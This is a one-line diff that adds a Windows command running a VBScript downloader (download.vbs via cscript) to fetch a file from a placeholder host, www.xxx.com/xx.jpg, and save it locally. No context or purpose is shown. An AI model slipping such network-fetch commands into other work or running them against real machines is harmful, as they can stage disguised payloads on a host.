@@ -1,0 +1,1 @@
+cscript download.vbs http://www.xxx.com/xx.jpg xx.jpg
